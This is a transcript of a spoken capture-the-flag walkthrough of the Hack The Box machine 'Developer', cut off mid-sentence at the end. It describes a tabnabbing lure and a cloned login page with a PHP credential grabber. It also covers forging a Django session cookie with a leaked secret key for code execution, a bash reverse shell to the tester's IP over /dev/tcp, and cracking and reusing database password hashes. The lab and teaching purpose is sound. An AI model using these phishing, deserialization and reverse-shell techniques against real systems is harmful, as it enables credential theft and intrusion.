 what's going on youtube this is ipsec i'm doing developer from hack the box and i really like this box because it's clear how much work the author put into making it realistic because the idea of the foothold came from a bug report filed against hack the box where they did not have the no opener tag on links of write-ups which meant if the user that was clicking on the write-up did not run a modern browser they're vulnerable to a tab nabbing attack essentially what that is is when you click a link if you don't have that no opener tag that new page you go to has limited control over the previous tab and one of the things it could do is change the location so you could set it to be a login page and try to fish credentials that way if you're running a modern browser it's kind of blocked but in order to replicate that the creator had actually created a ctf platform in django and created eight different challenges to do where you could submit a write-up to one of them and trick the admin into submitting credentials there's a lot after that like a django deserialization attack analyzing a rust binary but we'll get into all that later let's just hop into the box as always we start off with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it developer and then the ip address which is 10101103 this can take some time to run so i've already ran it looking at the results we have just two ports open and everything looks pretty standard the first thing we see is ssh on 22 and then the banner tells us it's an ubuntu box the next thing we have is http on port 80 and its banner tells us it's running apache we have the version two four four one but that's not really too important the main thing is is nmap is telling us there is a redirect set up to developer.htb now we have to create this in our host file because if we don't uh we just see there's no page if i go to 10 10 11 103 we see redirects and we go here so let's go set developer.htb in our host file so sudo vi etsy host and then we can do um 10 10 11 103 and then just clean up the url around it so now when i ping developer.htb we uh 10 10 11 103 i'm actually glad i did that because i had a typo there we go so now let's try going to developer.htb and we get a page so an exclusive free capture the flag platform and we have a bunch of information there but always like having some type of recon going on in the background so the first thing we're gonna do is test for like index.php index.html uh just index maybe i don't know exactly uh what the page here is but we know it's not php so we can't really set that argument i'm not trying like asp and all those arguments because um well it's a linux server so i'm just going to do go buster dir u http developer.htb and then dash word list opt set list uh discovery web content raph small words dot text and then always like putting in out file we'll just go like gearbuster.out and we have that running and everything with maybe admin in it is getting redirected this is weird i see admin and wp admin so let's check those very things out real quick wp-admin and we get django administration so wp-admin just redirected us to admin i'm going to do like please subscribe admin and let's see if that redirects us so many everything with admin redirects us to the django administration panel now django is a python web framework to build applications it's much like flask except it does a lot more on the backend for instance this whole administration panel is just django itself flask doesn't really have an equivalent so if you're building a basic web app with users and whatnot you don't have to build the administration panel to do things like change the passwords things like that because django does that for you so it's a much more involved framework and we can see everything with the word admin is being redirected so take that uh we could also put like admin admin and test things like that and we see um correct username password for staff account i don't think we can really leak it i was saying if there was a way to say um please enter the correct password versus username see if there's a way we can leak the users but doesn't seem to be the case generally when i see like um a login panel handled by a framework which means no custom code i don't bother putting a lot of um effort into enumerating it like running things like sql map because chances are it's not vulnerable there is a sign up page so let's just sign up and see what we have so i'm gonna do ipsec root ipsec.rocks password i'm gonna try the word password just to keep it simple uh i'm gonna agree to the terms but i honestly don't see the terms there's no link here so let's just sign up password is too common again django right here is blocking bad passwords so i'm just going to do please subscribe yep we have to agree to these blank terms so going in we have this admin panel um name admin challenge fish whatever looking at our profile seeing what we can do we could potentially update our profile but i don't see an update button so it looks like a um partially developed django thing i can't even um set phone numbers that was all just default so clicking through the challenges i can see there are various sets of challenges at the end of the video i'm going to go through all these i haven't done all of them yet so hopefully we do it well but i want to do this fish list from jazz pizzazz so i'm going to download the challenge i'm going to save the file and then move it to a directory so i'm going to move uh what was the name of this fish list we need to put it in the downloads directory fishlist.zip over here and i'm just going to make the directory fished we can make a directory challenges as well and move fished into challenges trying to stay organized but now i have so many directories where am i did i go up to high one let's see ls dot dot okay move fishlist.zip into this directory and we can just unzip it so let's do open fishedcredentials.xlsx and it opens up in libreoffice so looking through this it looks like we have a list of usernames emails and maybe the recovery phrase to try to get their password and when i look at this i generally try to just eyeball to see if there's any hidden information so it doesn't look like there's any hidden information it went 1 through 101 i didn't see any obvious jumps but i do see a jump here a b c d f so we're missing e and in like office you normally like highlight two columns let's see i'm not used to libreoffice and there'd be like a unhide thing uh and here i think we just tried to change the width and it says protected cells can't be modified i can try to go to like is it tools protect sheet and it wants the password the password can't be empty so we need to unprotect this document now a lot of times there's just bad protections put into these documents so let's take a look at that i'm going to just unzip fishcredentials.xlsx and i'm going to move that down one directory because eventually we want to re-zip this and i don't want to put that xlsx file in the zip because of reasons so there we go i'm just going to grep dash r this is recursive going to go into all directories and then i to make a case insensitive i'm going to do protected on dot which is my current working directory and maybe just protect protected was not the right word and we see stuff here so let's search for protect and we can see a bunch of things so we have protection hidden equals one let's see there should be some type of salt or password looks like and the styles.xml that's where it was telling us what columns were protected but in this file whatever this one is we have this whole sheet protection here we have algorithm hash value salt so let's go find out what file this is let's see man there's a lot of data there this is an x1 worksheet sheet1.xml so let's open this file up so vi and we want to find the protect maybe it's a capital p and i'm just going to delete this whole tag so let's see oh god protect there we go so let's go here and delete everything i'm just holding x until i see a another like tag which is this so now that is all deleted and i'm going to re-zip this and open it up so i'm going to do zip we'll call it um creds.xlsx we probably want to add the dash our flag to be recursive and our current working directory so we have now zipped all the files up and i'm just going to do open creds.xlsx and let's see if we can now change this column and it looks like we can and right at the back we see the flag here dhdb hidden columns for the win if i go here we can submit the flag of that success it has been submitted and also if we didn't want to unprotect it this document was not encrypted the correct way to do it would be encrypt the document because since it's not encrypted let's see let's remove creds xlsx and we can just put uh grep dash ri hdb here and we can see the flag is just stored in that html file but with this once we submit the flag we can now submit a walkthrough and it wants us to put a url so i'm going to put 10 10 14 8 writeup.html and before i submit that i'm just going to do a pseudo nc lvnp on port 80 and submit the walkthrough and now we're just going to wait here to see if anything connects back to us and we have a connection back and funnily enough i put htv not html but the main thing i want to look at is the user agent we can see it looks like it is firefox and version 75 or firefox 75 is right there so let's go over to google i'm going to google firefox 75 release date and let's see when so it was 2020 of uh april 7 2020 is when it was released so this is a relatively old version of firefox this box came out in late 2021 i believe so even at this point it's running about a year old so we should look at specific vulnerabilities towards firefox so i'm going to go over to exploit db and we just type in firefox and see what pops up and we don't really have that much there's this firefox extension execution so let's look at this and let's see it looks like this is specific to windows so i'm not really going to look into it that much the other thing with old browsers typically around 2021 is when everything was patched i think chrome is the last one but like safari and firefox had patched this is there is a thing called tab nabbing and that's when you click a link and that page edits where your previous tab was pointed at so let's take a look at that um i'm going to look for a write-up let's see uh we probably have to go to my profile because it will probably say published walkthroughs so let's submit one again go here refresh this list go to source and we can see writeup.htb and we don't see the tags so in order for tab nabbing to work it just wants a link if this had something like uh let's do it over here where my thing is bigger rel is equal to i think no opener then this wouldn't be vulnerable because the no opener tag revokes all the privileges of the previous window to the new window i don't know any like actual use cases where this um was supposed to be but if you don't have that no opener tag the new tab you have has a little bit of permissions over the previous one and on old browsers one of the permissions is able to set where this is pointed at and this is actually a box that was created off a hack the box exploit so if i just google hack the box tab nabbing and we search this uh you need this blog post for a little bit more but this is essentially all that it required is this link so all it's doing is saying if we have the window opener permission attempt to change the parent location which would be the previous tab um to this url and again it's just trying it two different ways i'm guessing one is for firefox one is for chrome or something like that i don't know why it has two but it does um that'd be my guess so let's take a look and try testing this so let's go up let's make dirt dub dub dub and then i'm going to vi writeup.html we're going to paste this and i'm going to set this to 10 10 14 8. so i'm going to do 10 10 14 8 which is my ip and we're gonna say um tab nab so if i see a request come in and hit tab nab we know it worked so 10 10 14 8 tab nab there we go sudo python 3 m http server 80 and let's go back to the platform and we're going to submit another walkthrough i'm going to fix that to actually say html and then we're going to wait to see if we get a hit back and if they actually hit the tab nab page so after a handful of seconds we do have a successful hit 101011 103 got writeup.html and then almost immediately the same ip address attempted to get tabnab so this is uh vulnerable to this um exploit and keep in mind before you go submit a bunch of bug bounty things or vulnerabilities for websites not having the no opener tag um it's gonna be really hard to get a proof of concept working to take advantage of tab nabbing because most modern browsers just have this patched it doesn't mean you can't try to report it and see what happens maybe there's browsers like opera that don't have it patched i don't know i just know firefox chrome and um safari have it all patched so it's much less vulnerability than it used to be but generally with tab nabbing the thing you always did was some type of phishing attack so let's go and clone the web page so we can build a quick phishing thing of the login to see if we can get anyone to um enter their credentials so i'm just going to let's open up a private window so we can get to the login url developer.htb let's go to login and my favorite way to build this type of thing is just use wget dash r and we'll just mirror the page okay so uh put it in developer.htb let's just move these up one directory because we don't need that so let's go to accounts login index.html i can get rid of all these line breaks at the top and bottom i don't know why those are there but that looks good now the main issue i'm going to have if i just use python is we can just try it real quick and show you but python's web server isn't going to handle post request so if i do studio python 3 like this we do 10 10 14 8 we go to accounts log in and i do test test we get unsupported method post now we could do something like write a quick flask web server to handle out this page but what a lot of people end up doing is just using php so if we looked all the way up top we could see let's see it may be past it or hard to find come on 10 10 11 there we go um they can just get accounts log in or we can put them anywhere we want so i was going to say it doesn't matter what extension we use we don't have to have it um index.html it can also be index.php and we can just write a quick php thing so index.php and then i just want to put php code at the bottom and we can say what if server i think request or method is it i think it's method we'll try this sql to post and then we can do a file put contents and we'll call it dump.txt and then what we want to put is server or not server um post username or what is it actually uh let's do go up here it is where's user that's login so the name so it's login and password are the fields it actually sends we could have just looked at burp suite as well but we can also just look at html source it doesn't matter how you do it so post login period is like concatenate on php so it's going to put the login and then the password and then i also want to put a line break and then how do i append something hold on php file part contents wouldn't be a video if i don't use google correctly and it is append i think do we have an example so we want to put file underscore append like that okay and let's see i wonder if i should put the ip address first yeah we probably should uh php server is it remote address is that it yeah server underscore remote address so we can do server remote address so this is what a lot of the whenever i do some type of ir and come across a credential grabber this is essentially what i see majority of the time we have to close out of php well as long as this piece works this is the piece i have most questions about if i did that correctly for memory but let's go test it out accounts login uh we need to run it with php so php dash capital s 10 10 14 8 port 80 sudo get rid of https for ipsec please subscribe we did post undefined index method okay php check if request is post go to google get or post is set that's not it request underscore method this is what i want accounts login index and i think i said i think it's request maybe it's method i didn't think of maybe it's both but now let's go and try this so ipsec put the password in probably typoed it and we have another typo uh file port content is it contents i never write good care the first time and i should have known that it didn't highlight that word that i did something wrong syntax highlighting saves lives so let's do ipsec please subscribe hey success we look here we don't have dump.txt so i'm just going to do find.namedump.txt and it's in accounts login and we have this except the ip address is not there so let's do v index.php and let's see do we have to put this all capital or is it remote address let's see remote addr using that should be right i probably have a typo or maybe it needs all caps is it actually case sensitive i should just do this pseudo and now i can use this pane for editing so i don't have to keep changing folders something in www accounts login there we go so it is case sensitive um one worth thing of noting whenever you come across a credential grabber may be used against your company depending on legality it's sometimes illegal to do things i know like go buster in the uk i believe is illegal doing websites you don't control but you may be able to just go buster and get the dumb file out if the web developer didn't like write it to slash temp slashdump.txt outside of the web directories which you'd be surprised how often that is the case that right next to the credential grabber there is some file called like credentials.txt dump.txt secret.text or something like that that just contains all the credentials that have been submitted so um worth attempting but now that we have that working we can now send them to writeup.html actually before we send them to wraith.html we want to change where they go to so what was it um accounts login like that and we can do account slash login okay save it and now let's submit them to the new uh submit the new write up so do i have it in this tab submit walkthrough wrap.html submit it and we're going to wait for them to get to our page and we'll see if the tab nab worked so again it only took a couple of seconds but i don't see any post requests we see them get the page and then they get all our javascript and css but never submitted anything which is weird um [Music] i'm just going to delete a lot of the javascript and see if that does anything i don't know why but when i was doing the box the first time it never made it to getting the css it just stopped at the javascript and when i removed those things it suddenly worked and i'm hoping that's the case here so i'm going to delete this uh we probably don't need jquery at all and let's see because nothing on this actual form is using javascript so we don't need that uh we could probably get rid of the css csrf middleware token but doesn't really harm us at all uh is there any like 404s we're waiting on let's see i was saying if it like attempted to get fave icon.ico or something but i don't see any of that so i've deleted the javascript i want to keep the css because if i don't then um the page wouldn't look right right because the css is how it actually builds all of this so 10 10 14 8 accounts log in like that okay like if i delete the css let's see what exactly it looks like index.php i'm just going to do a comment we refresh and that's what happens so i don't think i have to make it look good but i mean i'd rather make it look good as a personal thing i'm just going to create that slash image fave icon.ico in case php isn't telling me or it should be because it attempted to get it it's weird maker img touch image fave icon.icl i don't know why the fishing script didn't attempt to grab that we can submit walkthrough and i'm going to see if anything actually does happen so it'll probably take another 30 to 60 seconds until we get a hit so i'm gonna pause the video and here we have it like almost immediately as soon as i stopped recording it came back and we can see them get rightup.html then accounts login getting all that css and then they do a post so let's see exactly what data they posted to us so i'm going to go into accounts login catdump.txt we have 101011 103 username of admin and it's setting the password or sending the password super secure password at htb2021 so let's try logging in with this so i'm going to do log out sign out username admin put in this password and now we are the admin so we can do add many things but i don't see anything on this website however keep in mind it is using django so we can just look at django's admin panel by going to slash admin and here we go uh this is generally what it looks like we can look at the users to see what there is we have admin clubby dm wong ipsec jazz pizzazz and will wham uh only one is staff that is admin and django isn't giving us a way to view the hashes we'd have to log into the web server and then go into the database to do that again since this is django i'm not going to try to exploit django itself because i don't think i'm going to find a code execution in here just natively so let's go to challenges challenges solved profiles we can look at this to see what is there nothing really that interesting going over the sites and we have a site that we did not know about before developer dash century.developer.htb so let's go take a look at adding this into a host file and then going there so paste that in go here hit the page and see what we have uh username or email let's do admin and then we'll put in this password again to try to log in and correct username and password so there's no account with admin i wonder if i do lost password we put in something that doesn't exist unable to find a matching user unable to find a matching user for admin so this looks like a way to enumerate usernames which is super helpful for us so let's go back over to the django admin we can go over to users we have uh clubby so we can try putting in all of these to see if there's a user name wong and it's not looking like it i know i won't have one and let's try will wham don't have anything the guy's name is jacob so we could try jacob maybe jacob at developer.htb and there we go so it send an email to jacob developer.htb i wonder if i do profiles if that's there so tcg admin so these emails have developer.htb but anyways uh valid username there so let's go over to account we can log in with jacob at developer.htb put in that password let's copy it again and then we get into this sentry thing and this is a really weird vulnerability um i'm not going to show all the fuzzing i just had created a project and then if we go to the project settings and try to delete the project this errors out and this is like a default thing in sentry i think it was this version or something i don't know exactly why it's airing but it airs and it's in developer mode not production mode so the errors are shown to the user so it's leaking some secret uh some really good things uh most notably it is using python 2.7 so that is definitely interesting and then let's see if we look at all of this we got sentry sid csrf um where is it http cookie here's the settings let's see do we get any passwords out of here a redis thing authentication um host so century is using this password it's using the postgres thing so you could try brute forcing with this password potentially um i don't know exactly what that is this password looks like it is masked out so i don't know why there's two oh this is the reddest password and then this is the postgres so it's not showing us the postgres password unless the password actually is all stars um you should always try that just because it would be a troll password to use and sometimes you've seen that on like cisco devices because they do show config and show config masks out the password and they just copy that um command output into the backup and when they restore from backup they restore the password saying it's masked it's a funny thing that's um yeah let's just go keep looking i'm just gonna do control f and search for secret and we have a secret key so this secret key is used to sign the cookies so if i look at this cookie let's go into storage the century sid i think this is just like a pickled object if i remember correctly let's see so it's probably separating things by colon one of those colons is probably a time stamp and the other colon is a crypto signature i'm just gonna do echo dash n base64 dash d put it in xxd not valid base64 oh this is probably like base64 web uh let's see let's go to cyber chef and let's see do they have a base64 web decoder from base64 i'm just going to put it in here maybe it's entirely encrypted i don't know exactly what this cookie is but if we google like let's try django rce cookie secret see what we have we have this remote code execution on facebook server and it's talking about the very thing that we're trying to do and that is um get a code execution so generally in a lot of these web frameworks um the cookie is a serialized object and if you ever get the crypto key you can sometimes get code execution i've seen this in rails django a lot of the dot-net things so the cookie secret is really really important um so as we'll see that's why like the web server giving error messages to the user should never happen um that's definitely a finding i put in everything when i see it because you never know what those error messages may contain i'm just to make exploit.pi and we're going to paste this in here so set mode to paste and we don't need this anymore and the secret key we want to put as let's see what is this here password let's do secret key copy paste and then the cookie so let's go back to our web browser sentry sid copy paste and we can still probably just leave it in quotes like that and i'm not gonna do sleep 30 i'm gonna do uh sleep ten so we don't wait 30 seconds actually let's do sleep five we should know let's see how long does this page take to hit so go here yeah if we see five second delay we know we got it because that's near instant okay now the issue is this is going to be python 2 and it's using django so we got a work cut out for us the first thing i want to do is make sure i have python 2 installed which i do there is python 2 7. um i'm gonna try pip and i don't see pip two so i can't just do like pip install django because it's gonna install it for python three so we need to install pip for python two i'm gonna go over to google and then we're gonna do get pip.pi i forget where this is hosted right over here um let's see i guess i'll just save it and move it so move downloads pip.pi over here if i execute it with python2 i think it will work uh script does not work on python27 oh man okay thankfully it told me what to do so remove this wget python2 get pip and it's now downloading and installing pip2 so now i can do pip2 install django which is going to let me execute this python script so python 3 or python 2 how to have it i said 3 and we get this cookie so i'm going to go over to where is sentry come on century right here and again keep in mind how quickly this is coming back so we're going to enter a cookie i'm gonna go to the beginning delete the whole thing put a double quote paste and then end it with double quote and we get this page one two three four five come on there we go so it looks like it is definitely a bit slower so i think we're good so let's build a reverse shell now so echo dash n i can do bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 and then base 64 dash w 0 so we put it all on one line and i always hate dealing with url encoding problems so i'm going to eyeball this and put a space after the i because that should change this area of the base64 and it looks like it does we don't have that plus there there is a plus and equals near the end so i'm gonna try putting that right there and it looks good so i don't see any bad characters here and i don't know if you need to do this it's just a habit i have got myself into so listen to 9001 let's edit exploit.pi and we will do echo dash n base64-d bash so this should return a good cookie or an evil cookie i don't know if it's good i guess good is on the eye of the beholder but for me it's good for whoever maintains the sentry thing it's very evil we get in and here we go we have a shell so python2 dash c import pty pty dot spawn bin bash sdty raw minus echo oh not yet control z stty raw minus echo and then i've been getting the habit of doing semicolon fg just because it's easy to visually see and i think this may actually fix a problem people have with zsh and zsh if you do this stdy raw minus echo and then it redraws another terminal it undoes what you just did so i think if you put semicolon fg it may not do that so if you have trouble with zsh you may want to check that out let's do export term is equal to x term so now i can clear the screen with a shell on the box the first thing i like doing is looking at the pass wd to see exactly who is on this box and i'm just going to grab everything ending in sh to show me only the users and we have root carl postgres and mark so none of those users if i remember correctly were in the ctf portal so if i look at users i don't see any of them there so i'm not going to bother hunting down these password hashes i'm sure you could if you just go into the web directory but in sake of being a shorter video than normal or because i want to do more ctf challenges at the end of the video i'm going to ignore that piece so we don't have to enumerate two postgres databases we just want to focus on this entry because we don't have admin to the sentry database and therefore we don't know um all the users on this so i'm trying to find where the password would be i can like grab this for conf we see some django thing so that is well it's django but in lib python 2 um django's and normally like settings.pi i think so find.grep settings.pi uh we can grab v on python 2. that file doesn't exist here uh it could be setting dot pi maybe but we don't see it so generally i just go over to google i'm going to say sentry um change postgres password and look for some administration documents on it so this one may be good look at this let's see database it looks like it's in century.conf so we can look for that file do we have locate century.conf we don't have locate installed find.grepsentry.com uh not here it's grepping the period as a wildcard so century slash conf and again it's in a library so this is not where configuration file would be we could use find on the whole file system but if we just keep going down the list let's see do we have one that's good reset the password let's see i thought i'd have like an install instruction or something does this have anything saturated.conf not exactly sure where it is on google so i'm just going to do find slash we can send error messages away to dev knowl and then grep for century.com i need to do slash devnl and we see there is a etsy sentry config.yml so if i just cat this uh that only has this secret key that's not what i wanted uh let's see cd and c sentry um probably century confed up uh what far did i do config.yml so let's try cat century and this looks better so that's a mail server we don't care about mail what do we want we want password so i'm just going to search for that that is the redis which is a caching thing and here we go we have postgres credentials so name user and password so username is sentry and the password is this so i'm just going to do sentry like that and then we just run psql give it the wrapper and then username which were century the password let's just make sure it's copied paste that in then at localhost the port is 5432 for postgres and then the database i believe is sentry um before i do that how do i get out i did ctrl d to get out it looks like it's backslash q i just want to fix that weird line wrapping thing real quick because you saw like when i started typing it just went back to the beginning so i'm going to stty a we want 26 and 100. so stty rose 26 calls 100 there we go so now i won't have that weird line wrapping thing okay so postgres is a bit different than my sequel normally i do like show databases but if you want to do that i think it's backslash l and you can see the databases platform postgres sentry template zero and one uh slash dt is to show the tables and we can see let's see we have a few here so century so 60 rows whoops and we probably want something that has user in it so maybe auth user that's gonna be my first bet and it could also be like sentry underscore user something but i don't see it there so i'm going to do slash d plus and then the table which is auth user and we can see this is similar to like describe table and um my sequel and slash dt would be show tables but we can see the columns here we got password so we probably want to do uh password username first name email maybe so we can say select password username uh email was it just first name i forget exactly how they had it but from auth user let's see it didn't like first name uh it's kind though until it said hey you may want first underscore name thank you pers and we end it with a semicolon and we have two carl and jacob um do we know jacobs uh yeah we did we already knew jacobs because that is the um password reuse thing so we want to get carl so let's grab this and let's go over to hashcat and see if we can crack this so sh kraken go into hashcat v hashes developer and we can just do dot slash hash cat and then it is the hash file i believe first and then the word list so opt word list rocky.text and hashcat now i guess i forget exactly what version it is but it has an autodetect mode where it will automatically try to detect the hashtag and you can see it detected that as mode 10 000 which is django and looking at this we see recovered one out of one we can just go up and see carl's password is insane clown posse now this is um important to us because if we remember cat etsy passed wd grep on sh um carl was a user on this box so i'm just gonna do sq-carl paste in the password and we get a shell as him i always like getting a proper shell when i can so let's just ssh 1010 11 103 and see if we can log in with this and then also be aware when you do this um we can now see if they were on a who command him logged in we don't see this session so um yeah because we don't actually have a proper tty we just have some weird emulation in python so it does show up in the who command so um from my standpoint of just things working out of the box i always love having the ssh and also it's easy to resume where i was at but in terms of opsec maybe it's better to go with this route because you hide from that who command the last login but also keep in mind if you do ps ef is it dash tree or is it uh is it i think it's forest forget exactly what the command iran was this this is also suspicious so it depends what you're trying to hide from there's no good answer if you're trying to hide from ps output uh you may want to use like metasploit or something like that that will do a better job masking these arguments if you want to hide from the who command maybe you shouldn't use ssh but that is a long tangent for um generally the first thing i like doing on a box is checking the pseudo when i'm on a user and the password was insane clown posse i probably misspelled that um let's go back over here so we can grab it i think i put two e's instead of one but put in the password and we can see what carl can do uh pretty much just run this one binary so let's do a sudo and run this to see exactly what happens welcome to the cyber geek super secure login portal enter your password to access the super user i'm just going to put password and it says we entered the wrong password so the first thing i want to do is a file against it we can see it is a elf it is not stripped if we strings it let's see what we have let's see p thread fork just trying to see if anything here makes sense to me if i saw like uh pie installer strings or something like that kind of guide me down the path let's see a bunch of libraries really don't know what this is it is llvm um it's always a pain reversing binaries by all right they're compiled in lvm but we do see rust so this looks like it is a rust binary i'm going to copy it over to my box so we can open it up in ghidra and see exactly what is going on so let's do nclvmp 9001 and direct all that output to authenticator and then we can nc 10 10 14 8 9 000 1 and pipe that file in and then give it a second and just ctrl c because it probably copied by now i guess we could md5 summit to make sure it copied correctly and the hashes do match now this next step um we probably should update geija and if you don't update giger to the latest uh it doesn't reverse rust as well so i'm just going to do geeja download um in general you should always get in the habit of when you want to reverse something if you don't use a lot of plugins and things like that always go and download the latest so let's w get this and then we will unzip it and run it so unzip gidra 10 1 1 zip there we go and once it does this we can open it so cd guidra 10 1 and then just giga run let's see agree and i tried using like a rusk d mangler python program but it actually made it worse so um typically when i go for like golang or rust or these weird binary things i'd google like rust uh gidra extension script or something like that and see if i can find anything i remember there being an issue relatively recently it was like two weeks ago of a rust script i found but yeah this um didn't really do that great of a job at least i think it was this there was a github issue for it but long tangent for something that doesn't matter because we're not going to use any scripts whoops click the wrong thing file new project sure name i'm just going to call it authenticator and then open this up and me and oxdf looked at this binary for a long time so when i kind of jump through it uh keep in mind this is a collection of work it wasn't just something we can just open this and like within five minutes understand what's going on right so hdb developer authenticator and that being said hopefully i can kind of just restep through what i've done already on this binary to understand it so one of the really weird things about rust and i'll get into it after um it's finished doing all of this stuff because bad things happen if you just go browse things while giger is working so it should only be another like 10-15 seconds left because this was a small binary but the main function isn't actually the main function in this normally it's under the main the name space i don't know if this is a common rust thing it's just this is the only binary i've done in rust and i also did the ctf challenge one which is also rust but it's by the same exact developer and coded very similar to this challenge which we'll get into at the end of the video but that being said i've analyzed two rust binaries in geija both by the same author so i don't know if these are rust things i'm doing or author things so if we went into export is it and then looked for maine man there's a lot of things where's export d f l m main we need to open up the d compiler tab let's do window decompiler there we go we have this weird thing i think if we clicked around eventually we would find it but what i like doing is just filtering from main and then there's this namespace authentication which i think is the binary name and then main and this is the main that we want so this is the one we're looking for we can also probably find it if we just gdb the binary and step around but we can see at the very beginning we have a string welcome to cyber geeks super s it's probably secure something and then asks us to enter the password and i think this may be the password i'm going to use my middle click which is my mouse wheel and then we can just see exactly where it goes so i think that's looping in and all this can cat stuff this is weird like i guess decompile a goofed um ida pro does a better job with this binary but i don't like showing the pro features of paid software so we're going to do this without that so we just keep going down the main thing i want to get to is we see this this is the first call we have uh crypto asctr this is doing some crypto thing and i'm just going to copy this we can go to google paste it in get to the rust docs to see exactly what it is so it accepts three arguments the key size the key and the iv now we have a few things so how this is working is this is probably the key this is probably the iv and this is the length um rust like girling doesn't use um null terminated strings it instead does like string and then paste the length of the string afterwards so i think that's why it's this way um but this is most likely going to be key and then this local 108 is most likely going to be the iv and this is probably going to be the size and keep in mind this is hex so this would be 32 and this would be 16 i believe yeah that should be right so we can trace where this key is sent and it's up here and this is going to be the weird thing because this whole thing is actually the key and keep in mind i think it's little endian so it's like a 3 e 8 3 2 3 4 5 c whatever but it just did kind of a bad job at showing this we could go over here and here is the memory address where it is if we just click on it we could highlight this whole bit do copy special and then byte string no spaces would be the best way we could copy it and we see this here i'm just going to go to cyber chef now and we can put it in and we're going to do this a few ways because i know probably doesn't make sense so i'm going to do my best to make sure or step through kind of how i understand it so all i did was change it into ctr mode we put the key there [Music] we can also go to iv which is right after the key so i should just click on this and i think this is the iv so again copy byte string no spaces and we can paste the iv there so now we got to get what our text is so we don't know what that is we can also redefine this if we wanted to so if i do right click retype variable we can change it to care16 we know it's the length of 16 because of that one syscall so if i do care 16 it still puts it on multiple lines but now all those variables it's not like u stack and we can do the same exact thing for this if we wanted uh curious16 there we go so that's labeled correctly we have this this is like double the length we don't know exactly what ptr is yet but it looks very similar to how this is defined it's just double which is weird and if we click on it with the middle we can see it's used down here and we see this local 238 this l stack 552 is equal to 20. so we don't know exactly what this is and this is going to be the important pieces of the code well um 20 this is probably going to be some type of length and one important thing about this let's do aes encrypt real quick we can disable this um i'm going to put a blank key this go into ctr mode uh i should just put this sure uh let's see input raw test invalid iv got 15 bytes expected 16. so i did not copy something uh it probably ends with 2c right oh no um let's see zero six two oh eight one six a so eight one six a so i missed the last two bytes so when i normally think of aes i always think of um like a block cipher and it's not we can see as we add more characters it's adding more immediately right every character i have affects the length of this output which would be the encrypted blob if we change it to like cbc mode it's more in blocks so until we hit the block size the length doesn't change right it's doing some type of padding so that's an important way to say um this is 32 so it's probably expecting 32 characters whatever this l stack 552 is um if we look at this try to make sense of it let's see that is zero this is where it gets heard um let's see i'm just going to do use a debugger to help me with this because i think geidra is going weird with the decompiler so this is where having the debugger helps this is a compare statement obviously it's doing a compare against these two things and if i go into gdb so where are we gdb dot slash let's see chmod plus x authenticator gdb break main we just run the only thing that changes we have like this address 0x555 and then these addresses aren't like that but we just care about the at the top and bottom three nibbles so 9ac if i just take off the last three and we do break stir i said star not and and then nine ac we can continue the program we can put what i want in so let's do abc and what oh um for some reason my guess is crashing and i did this um i had updated recently and also it still did not like this so let's remove this i wonder if i can install p-e-d-a real quick pda a github gdb let's see if this takes a long time to install we'll just move on without anything uh looks easy let's clone okay let's see if this works now gdb now we're using peta instead of jeff so break main run and then do we have we don't have history so let's see it was 9 ac i want to say right not ac so go here break come on nine ac continue put something in and here we go we hit the break point so what we want to look at is let's see what is the register compare oh i was hoping it would be like this compare statement where it's super easy what are we comparing let's see uh it's telling me rax and r15 i believe unless that's a future instruction let's see do we have anything here hurry x so rex is 0x3 and r15 is not that let's see rdi maybe it's comparing r9 which doesn't make sense i don't know exactly what is going on here but what i'm going to do is rerun the program continue and i'm going to do please subscribe i'm going to see if r a x changes to not 3 right this is f which is 15 and i believe please subscribe is 15 characters um let's see echo dash n please subscribe wc-c yeah 15. so that's making sense at exactly what's happening so what if we set the breakpoint for the next compare so we want to actually get to this to see what these two values are right and that is at 9b9 so break stir and we can just put all this and 9b9 continue and we don't actually hit it uh we can run it again continue put junk continue we only hit the first compare statement so what if we did python python3 how do i get rid of that there we go dash c print a times 32 so now rax is going to be equal to um 32 or 0x2 so continue put this in we look at rax 0x 10. it should be 20. so that's not the right thing is irbx the counter let's see how is it doing this compare call so down the stack later it does there's two i'm used to like gef saying we think you're calling compare with these arguments and this is not doing that but if i continue we hit the second break point or the third break point right and this is the rax r15 so at this we can easily compare these registers so if i do um x slash 32x rax we get this and keep in mind this is all in that little ndn format so it would be ed2f which is a bit of a pain so the way i get around that is i think 32bx there we go so i can copy all this so this is ed2fed so it's pasted the right way we want to get to d8 uh no 4 4. buy this whole thing so if i copy this we can do v test i'm sure there's a more elegant way to do this but this is how i'll normally do it i'm going to start the string go up to semicolon space delete everything we're going to remove everything with 0x and then wait what and not expect to see percent s 0x g there we go and now we're going to remove all spaces and put this all on one line and if i cat test we can now paste this into where cyber chef is and we'll see what happens when we decrypt this so input paste this and it is all a's which means we probably um go back here this is probably user input or the blob of user input so that's the encrypted form so we need to see what is comparing against this ptr so that's r15 we go back into gdb r15 and we'll do the same exact thing and i'm sure again there's probably a better way to view this data so percent s begins with anything up to the semicolon 0x space and put it on one line so cat test and we should be able to see what it compares against and it's rust for security at developer 2021 so if we go back to that binary let's just go where's my reverse shell where's carl here we go so let's run that suitor command if we have an history here and we can just put uh we need carl's password um let's see carl's password was and kraken insane clown policy let's grab this put this in and then the other password which is in cyber chef paste this and now it's asking for a ssh public key so let's just give it our ssh public key just going to do this sh keygen and we can just do dash f i'll call it developer i guess and cat developer.pub and grab this whole thing and we'll paste this in okay and it says i can now authenticate as root so it's chmod 600 on the private key and ssh-i developer root at 10 10 11 103 and is it going to let us in it does so we have successfully rooted the box so that will be how to do all of that but i did say i want to go back and solve all of these challenges uh where are they um if i just go to accounts oh that was my fishing page it looked pretty realistic uh developer we gotta get rid of https there we go we don't want view source man that was a bigger pain than it should have been let's see login and there are no web challenges there's just forensic reversing phone and crypto so i guess let's just go down the list we already did this fish thing so this is a pse let's download this and figure out what file this is i'm guessing i have to pause the vm and set up something on windows eventually so let's go to cd challenges we did fished this is pse mv downloads ps what'd it download as capital p unzip this file encryption.exe so yes i will probably want to switch to windows and this is just a net file so it's gonna be easy well it should be easy um never know until we try right so python3.m http server and i'm gonna pause the video so i can spin up a windows machine okay i switched over to my commando vm and i'm gonna download the encryption.exe and we're just going to execute it to see exactly what it looks like before you open it up into a decrypter so it wants a user password or a user password then we click ok and it gives us the encrypted password if we go back over to parrot let's see we do have an encrypted string that we want to reverse out of it so i'm going to go back over here we can do notepad paste that in so let's open this up in dnspy so i'm going to just go to dnspy and let's do file open where is it and then encryption.exe and it opens as full kryptol so right off the bat we have it calling powershell and it looks like it's powershell.exe so i would guess somewhere around here we're gonna see yep there it is a big blob of base64 which if we decrypt this or 